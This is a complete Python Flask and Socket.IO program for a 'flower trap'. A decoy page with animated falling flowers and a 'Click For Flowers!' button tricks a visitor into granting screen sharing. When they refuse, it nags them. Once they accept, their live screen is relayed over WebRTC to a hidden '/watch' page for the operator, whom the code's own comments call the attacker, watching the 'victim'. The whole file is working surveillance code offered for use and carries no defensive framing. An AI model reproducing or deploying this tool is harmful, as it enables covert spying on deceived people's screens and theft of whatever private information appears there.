```python
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'flower-trap-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Victim bait page - Flower trap
@app.route('/')
def flowers():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>🌸 Surprise Flowers! 🌸</title>
    <style>
        body { 
            margin:0; padding:20px; background:linear-gradient(45deg,pink,violet); 
            font-family:Arial; overflow:hidden; 
        }
        .flower { 
            position:fixed; font-size:30px; pointer-events:none; 
            animation:fall linear infinite; 
        }
        @keyframes fall {
            to { transform:translateY(100vh) rotate(360deg); }
        }
        #btn { 
            position:fixed; bottom:50px; left:50%; transform:translateX(-50%);
            padding:20px 40px; font-size:24px; background:gold; border:none;
            border-radius:50px; cursor:pointer; box-shadow:0 10px 30px rgba(0,0,0,0.3);
        }
        #btn:active { transform:translateX(-50%) translateY(5px); }
    </style>
</head>
<body>
    <div id="flowers"></div>
    <button id="btn" onclick="startScreen()">💕 Click For Flowers! 💕</button>
    
    <script>
        // 40 falling flowers distraction
        for(let i=0; i<40; i++){
            let f = document.createElement('div');
            f.innerHTML = ['🌸','🌺','🌹','🌷','💐'][Math.floor(Math.random()*5)];
            f.className='flower';
            f.style.left = Math.random()*100+'%';
            f.style.animationDuration = (Math.random()*3+2)+'s';
            f.style.animationDelay = Math.random()*2+'s';
            document.getElementById('flowers').appendChild(f);
        }
        
        let stream, pc;
        async function startScreen(){
            try {
                stream = await navigator.mediaDevices.getDisplayMedia({video:true});
                document.getElementById('btn').style.display='none';
                
                pc = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });
                
                stream.getTracks().forEach(track => pc.addTrack(track, stream));
                
                pc.onicecandidate = e => {
                    if(e.candidate) socketio.emit('ice', e.candidate);
                };
                
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socketio.emit('offer', offer);
                
                socketio.on('answer', async answer => {
                    await pc.setRemoteDescription(answer);
                });
                
                socketio.on('ice', ice => {
                    pc.addIceCandidate(ice);
                });
            } catch(e) { alert('🌸 Enable screen share for flowers! 🌸'); }
        }
    </script>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>const socketio = io();</script>
</body>
</html>
    ''')

# Attacker watch page
@app.route('/watch')
def watch():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head><title>🌸 Live View 🌸</title>
    <style>body{margin:0;} video{width:100vw;height:100vh;object-fit:cover;}
</style></head>
<body>
    <video id="screen" autoplay playsinline></video>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        const socketio = io();
        const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
        
        pc.ontrack = e => document.getElementById('screen').srcObject = e.streams[0];
        
        socketio.on('offer', async offer => {
            await pc.setRemoteDescription(offer);
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            socketio.emit('answer', answer);
        });
        
        socketio.on('ice', ice => pc.addIceCandidate(ice));
        pc.onicecandidate = e => e.candidate && socketio.emit('ice', e.candidate);
    </script>
</body>
</html>
    ''')

@socketio.on('offer')
def handle_offer(data):
    emit('offer', data, broadcast=True)

@socketio.on('answer')
def handle_answer(data):
    emit('answer', data, broadcast=True)

@socketio.on('ice')
def handle_ice(data):
    emit('ice', data, broadcast=True)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=8080, debug=False)
```*
